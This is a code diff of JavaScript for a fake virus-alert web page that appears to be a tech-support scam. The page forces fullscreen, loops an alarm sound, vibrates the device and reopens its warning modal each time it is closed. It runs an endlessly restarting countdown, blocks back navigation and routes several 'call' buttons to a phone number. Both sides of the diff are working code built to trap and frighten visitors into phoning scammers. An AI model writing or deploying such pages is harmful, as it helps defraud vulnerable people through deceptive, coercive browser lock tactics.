@@ -1,117 +1,128 @@
 $(document).ready(() => {
-  const virusModal = document.getElementById("virusModal");
-  const modalInstance = new bootstrap.Modal(virusModal);
-  const audioPlayer = document.getElementById("audioPlayer");
-
-  // Function to start the countdown timer
-  function startCountdown() {
-    let timeInSeconds = 5 * 60; // 5 minutes in seconds
-
-    const countdown = setInterval(() => {
-      let minutes = Math.floor(timeInSeconds / 60);
-      let seconds = timeInSeconds % 60;
-
-      // Format minutes and seconds to always show 2 digits
-      minutes = minutes < 10 ? "0" + minutes : minutes;
-      seconds = seconds < 10 ? "0" + seconds : seconds;
-
-      // Update the timer display
-      document.getElementById("countdown-timer").innerText = `${minutes}:${seconds}`;
-
-      // Decrease time by 1 second
-      timeInSeconds--;
-
-      // When the countdown reaches 0, stop the timer
-      if (timeInSeconds < 0) {
-        clearInterval(countdown);
-        alert("Time is up! Take action now.");
-      }
-    }, 1000);
-  }
-
-  // Function to play audio in a loop
-  function playAudioLoop() {
-    audioPlayer.play().catch((error) => {
-      console.warn("Audio play was blocked: ", error);
-    });
-    audioPlayer.addEventListener("ended", () => {
+    function startCountdown() {
+      let timeInSeconds = 5 * 60; // 5 minutes in seconds
+  
+      const countdown = setInterval(() => {
+        let minutes = Math.floor(timeInSeconds / 60);
+        let seconds = timeInSeconds % 60;
+  
+        // Format minutes and seconds to always show 2 digits
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+  
+        // Update the timer display
+        document.getElementById(
+          "countdown-timer"
+        ).innerText = `${minutes}:${seconds}`;
+  
+        // Decrease time by 1 second
+        timeInSeconds--;
+  
+        // When the countdown reaches 0, restart the timer
+        if (timeInSeconds < 0) {
+          clearInterval(countdown);
+          startCountdown(); // Restart the countdown
+        }
+      }, 1000);
+    }
+  
+    // Start the countdown
+    startCountdown();
+  
+    const virusModal = document.getElementById("virusModal");
+    const modalInstance = new bootstrap.Modal(virusModal);
+    const audioPlayer = $("#audioPlayer")[0];
+  
+    audioPlayer.play();
+  
+    audioPlayer.addEventListener("ended", ()=> {
       audioPlayer.play();
-    });
-  }
-
-  // Function to enable fullscreen and vibrate
-  function goFullScreenAndVibrate() {
-    const element = document.documentElement; // Use the whole document for fullscreen
-
-    if (element.requestFullscreen) {
-      element.requestFullscreen();
-    } else if (element.mozRequestFullScreen) {
-      element.mozRequestFullScreen(); // Firefox
-    } else if (element.webkitRequestFullscreen) {
-      element.webkitRequestFullscreen(); // Safari
-    } else if (element.msRequestFullscreen) {
-      element.msRequestFullscreen(); // IE/Edge
+    })
+  
+    // Function to go fullscreen
+    function goFullScreenAndVibrate() {
+      const element = document.documentElement; // Use the whole document for fullscreen
+  
+      if (element.requestFullscreen) {
+        element.requestFullscreen();
+      } else if (element.mozRequestFullScreen) {
+        // Firefox
+        element.mozRequestFullScreen();
+      } else if (element.webkitRequestFullscreen) {
+        // Chrome, Safari and Opera
+        element.webkitRequestFullscreen();
+      } else if (element.msRequestFullscreen) {
+        // IE/Edge
+        element.msRequestFullscreen();
+      }
+  
+      navigator.vibrate(200);
+      modalInstance.show(); // Show the modal
     }
-
-    // Trigger a vibration pattern
-    if (navigator.vibrate) {
-      navigator.vibrate([200, 100, 200]); // Custom vibration pattern
-    }
-  }
-
-  // Function to ensure fullscreen persists
-  function ensureFullScreen() {
-    if (!document.fullscreenElement) {
-      goFullScreenAndVibrate();
-    }
-  }
-
-  // Start the countdown timer
-  startCountdown();
-
-  // Ensure fullscreen is triggered when the modal is shown
-  if (virusModal) {
-    virusModal.addEventListener("show.bs.modal", () => {
-      goFullScreenAndVibrate();
-      playAudioLoop();
-    });
-
-    // Reopen the modal and fullscreen when it is hidden
-    virusModal.addEventListener("hidden.bs.modal", () => {
-      setTimeout(() => {
-        modalInstance.show();
+  
+    if (virusModal) {
+      // Event listener for when modal is shown
+      virusModal.addEventListener("show.bs.modal", (event) => {
         goFullScreenAndVibrate();
-      }, 300); // 0.3-second delay
+        audioPlayer.play();
+  
+        audioPlayer.addEventListener("ended", ()=> {
+          audioPlayer.play();
+        })
+      });
+  
+      // Event listener for when modal is about to hide
+      //   virusModal.addEventListener("hide.bs.modal", (event) => {
+      //     console.log("Sagar");
+      //   });
+  
+      // Event listener for when modal is completely hidden
+      virusModal.addEventListener("hidden.bs.modal", (event) => {
+        // Reopen the modal after 1 second
+        setTimeout(() => {
+          modalInstance.show();
+          goFullScreenAndVibrate();
+        }, 300); // 0.3 second delay
+      });
+    }
+  
+    window.addEventListener("touchstart", () => {
+      if (virusModal) {
+        goFullScreenAndVibrate();
+      }
     });
-  }
-
-  // Trigger fullscreen on user interaction
-  window.addEventListener("touchstart", goFullScreenAndVibrate);
-  window.addEventListener("click", goFullScreenAndVibrate);
-
-  // Handle button actions for fullscreen, audio, and call
-  $("#vibrateButton").on("click", () => {
-    goFullScreenAndVibrate();
-    playAudioLoop();
+  
+    window.addEventListener("click", () => {
+      if (virusModal) {
+        goFullScreenAndVibrate();
+      }
+    });
+  
+    // Add event listener for button vibration
+    $("#vibrateButton").on("click", () => {
+      goFullScreenAndVibrate();
+    });
+  
+    // Add event listener for button vibration
+    $("#callButton").on("click", () => {
+      // Replace with the desired phone number
+      const phoneNumber = "tel:+18778381219";
+      window.location.href = phoneNumber;
+    });
+    $("#callButton1").on("click", () => {
+      // Replace with the desired phone number
+      const phoneNumber = "tel:+18778381219";
+      window.location.href = phoneNumber;
+    });
+    $("#callButton2").on("click", () => {
+      // Replace with the desired phone number
+      const phoneNumber = "tel:+18778381219";
+      window.location.href = phoneNumber;
+    });
+  
+    // Prevent the backspace key from navigating back.
+    history.pushState(null, null, window.location.href);
+    history.back();
+    window.onpopstate = () => history.forward();
   });
-
-  $("#callButton, #callButton1, #callButton2").on("click", () => {
-    goFullScreenAndVibrate();
-    playAudioLoop();
-
-    // Redirect to phone dialer
-    const phoneNumber = "tel:+18778381219";
-    window.location.href = phoneNumber;
-  });
-
-  // Prevent back navigation
-  history.pushState(null, null, window.location.href);
-  window.onpopstate = () => history.forward();
-
-  // Prevent screen sleep using the Screen Wake Lock API
-  if ("wakeLock" in navigator) {
-    navigator.wakeLock
-      .request("screen")
-      .catch((err) => console.error("Wake lock error:", err));
-  }
-});
+  
